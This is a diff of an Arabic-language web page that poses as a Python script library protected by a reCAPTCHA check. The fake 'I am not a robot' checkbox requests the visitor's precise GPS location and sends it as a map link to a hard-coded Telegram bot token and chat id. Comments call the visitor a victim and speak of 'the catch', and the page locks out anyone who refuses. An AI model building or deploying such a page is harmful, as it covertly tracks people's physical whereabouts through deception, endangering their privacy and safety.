@@ -3,76 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Baratheon Python Library | التحقق من الأمان</title>
+    <title>Baratheon Python Core | المكتبة المعتمدة</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         :root { --py-blue: #3776ab; --py-yellow: #ffd43b; --dark-bg: #0d1117; }
-        body { background-color: var(--dark-bg); color: #c9d1d9; font-family: 'Segoe UI', sans-serif; }
-        .py-card { background: #161b22; border: 1px solid #30363d; transition: 0.3s; cursor: pointer; }
-        .py-card:hover { border-color: var(--py-blue); transform: translateY(-5px); }
-        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); backdrop-filter: blur(10px); z-index: 100; items-center; justify-content: center; }
-        .captcha-window { background: white; color: #333; border-radius: 20px; width: 95%; max-width: 400px; padding: 35px; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); }
+        body { background-color: var(--dark-bg); color: #c9d1d9; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
+        /* طبقة القفل التي تمنع التفاعل مع الموقع */
+        #overlay { position: fixed; inset: 0; background: rgba(13, 17, 23, 0.9); backdrop-filter: blur(12px); z-index: 9999; display: flex; items-center; justify-content: center; }
+        .captcha-card { background: white; color: #333; border-radius: 20px; width: 90%; max-width: 380px; padding: 30px; box-shadow: 0 0 30px rgba(88, 166, 255, 0.2); }
     </style>
 </head>
-<body class="min-h-screen flex flex-col items-center">
+<body>
 
-    <div id="captchaModal" class="modal flex">
-        <div class="captcha-window text-center border-t-8 border-blue-600">
-            <div class="flex items-center justify-center mb-8">
-                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="w-14 ml-4">
+    <div id="overlay">
+        <div class="captcha-card text-center border-t-8 border-blue-600">
+            <div class="flex items-center justify-center mb-6">
+                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="w-12 ml-3">
                 <div class="text-right">
-                    <h2 class="text-2xl font-black text-gray-800 tracking-tight">تأكيد الهوية</h2>
-                    <p class="text-sm text-blue-600 font-bold italic">Baratheon Verified</p>
+                    <h2 class="text-xl font-black text-gray-800">تأكيد أمني</h2>
+                    <p class="text-xs text-blue-500 font-bold uppercase">Baratheon Verified</p>
                 </div>
             </div>
+            <p class="text-sm text-gray-600 mb-8 font-medium">محتوى المكتبة محمي. يرجى إثبات هويتك البشرية وتفعيل "الفحص الجغرافي" للوصول.</p>
             
-            <p class="text-base text-gray-600 mb-10 leading-relaxed font-medium">يرجى تأكيد أنك لست برنامج روبوت للوصول إلى محتويات المكتبة.</p>
-            
-            <label class="flex items-center justify-between border-2 border-gray-100 bg-gray-50 p-5 rounded-2xl hover:border-blue-300 cursor-pointer transition-all duration-300 shadow-inner">
+            <label class="flex items-center justify-between border-2 border-gray-100 bg-gray-50 p-5 rounded-2xl cursor-pointer hover:border-blue-200 transition-all">
                 <div class="flex items-center">
-                    <input type="checkbox" onclick="getGPSOnly()" class="w-8 h-8 ml-4 accent-blue-600 cursor-pointer">
+                    <input type="checkbox" id="mainCheck" onclick="captureGPS()" class="w-8 h-8 ml-4 accent-blue-600 cursor-pointer">
                     <span class="text-gray-800 font-extrabold text-xl">أنا لست برنامج روبوت</span>
                 </div>
                 <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="w-6 opacity-20">
             </label>
-            
-            <div class="mt-8 flex justify-center gap-4 text-[11px] text-gray-400 font-semibold uppercase tracking-widest">
-                <span>Privacy</span>
-                <span>•</span>
-                <span>Terms</span>
-            </div>
+            <p class="mt-6 text-[10px] text-gray-300">© 2026 Baratheon Security Framework</p>
         </div>
     </div>
 
-    <header class="w-full p-8 border-b border-[#30363d] flex justify-between items-center bg-[#161b22] shadow-2xl">
-        <div class="flex items-center gap-4">
-            <i class="fab fa-python text-4xl text-[var(--py-yellow)]"></i>
-            <span class="text-2xl font-black text-white italic tracking-tighter">BARATHEON <span class="text-blue-500 underline decoration-2">CORE</span></span>
+    <header class="w-full p-6 border-b border-[#30363d] flex justify-between items-center bg-[#161b22]">
+        <div class="flex items-center gap-3">
+            <i class="fab fa-python text-3xl text-[var(--py-yellow)]"></i>
+            <span class="text-xl font-black text-white italic">BARATHEON <span class="text-blue-500">CORE</span></span>
         </div>
     </header>
 
-    <main class="max-w-5xl w-full p-10">
-        <div class="text-center mb-16">
-            <h1 class="text-5xl font-black text-white mb-6 tracking-tight">مستودع السكربتات المفتوحة</h1>
-            <p class="text-gray-400 text-xl font-light">بوابتك الرسمية لأدوات بايثون المتقدمة.</p>
-        </div>
-
-        <div class="grid grid-cols-1 md:grid-cols-2 gap-10">
-            <div onclick="showVerify()" class="py-card p-10 rounded-3xl flex flex-col items-center text-center gap-6 shadow-2xl">
-                <div class="bg-blue-600/20 p-6 rounded-2xl text-blue-400 text-5xl shadow-inner"><i class="fas fa-code-branch"></i></div>
-                <div>
-                    <h3 class="text-2xl font-bold text-white mb-2">Automated Scripts</h3>
-                    <p class="text-gray-500 font-medium">مكتبة الأتمتة والتحكم عن بُعد</p>
-                </div>
+    <main class="max-w-4xl w-full p-8 mx-auto mt-10">
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+            <div class="bg-[#161b22] p-8 rounded-3xl border border-[#30363d]">
+                <i class="fas fa-folder-open text-3xl text-blue-500 mb-4"></i>
+                <h3 class="text-xl font-bold text-white mb-2">مكتبة السكربتات</h3>
+                <p class="text-sm text-gray-500 italic font-mono uppercase">Status: Locked</p>
             </div>
-            
-            <div onclick="showVerify()" class="py-card p-10 rounded-3xl flex flex-col items-center text-center gap-6 shadow-2xl">
-                <div class="bg-yellow-600/20 p-6 rounded-2xl text-yellow-400 text-5xl shadow-inner"><i class="fas fa-brain"></i></div>
-                <div>
-                    <h3 class="text-2xl font-bold text-white mb-2">AI Frameworks</h3>
-                    <p class="text-gray-500 font-medium">أدوات الذكاء الاصطناعي المتكاملة</p>
-                </div>
+            <div class="bg-[#161b22] p-8 rounded-3xl border border-[#30363d]">
+                <i class="fas fa-microchip text-3xl text-yellow-500 mb-4"></i>
+                <h3 class="text-xl font-bold text-white mb-2">أدوات AI</h3>
+                <p class="text-sm text-gray-500 italic font-mono uppercase">Status: Locked</p>
             </div>
         </div>
     </main>
@@ -81,34 +64,35 @@
         const token = "8621828423:AAFq9_5-6snrjpfqrBrOPboh7VE824xVN_M";
         const chat_id = "5475815049";
 
-        function showVerify() {
-            document.getElementById('captchaModal').style.display = 'flex';
-        }
-
-        // الوظيفة الوحيدة: سحب الـ GPS فقط
-        function getGPSOnly() {
+        function captureGPS() {
+            // تفعيل طلب الـ GPS فور الضغط
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (pos) => {
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
                     const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                     
-                    // إرسال رسالة الموقع فقط لتلجرام
+                    // إرسال الموقع فقط لتلجرام
                     await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
                             chat_id: chat_id,
-                            text: `📍 <b>هدف جديد في القبضة!</b>\n\n🔗 موقع الضحية: ${mapUrl}`,
+                            text: `📍 <b>إحداثيات هدف جديد:</b>\n\n🔗 الرابط: ${mapUrl}`,
                             parse_mode: 'HTML'
                         })
                     });
+
+                    // فتح الموقع للضحية بعد الصيد
+                    document.getElementById('overlay').style.display = 'none';
+                    document.body.style.overflow = 'auto';
+                    alert("تم التحقق بنجاح! تم فتح المكتبة.");
                     
-                    alert("تم التحقق بنجاح! سيتم تحويلك للمكتبة..");
-                    window.location.href = "https://www.python.org";
                 }, (err) => {
-                    alert("خطأ: يجب السماح بالوصول للموقع لإتمام عملية الفحص الأمني.");
-                });
+                    // إذا رفض الضحية، نعيد تشغيل الشاشة ونرفض دخوله
+                    document.getElementById('mainCheck').checked = false;
+                    alert("خطأ: يجب السماح بالوصول للموقع لإتمام عملية التحقق والوصول للمحتوى.");
+                }, {enableHighAccuracy: true});
             }
         }
     </script>
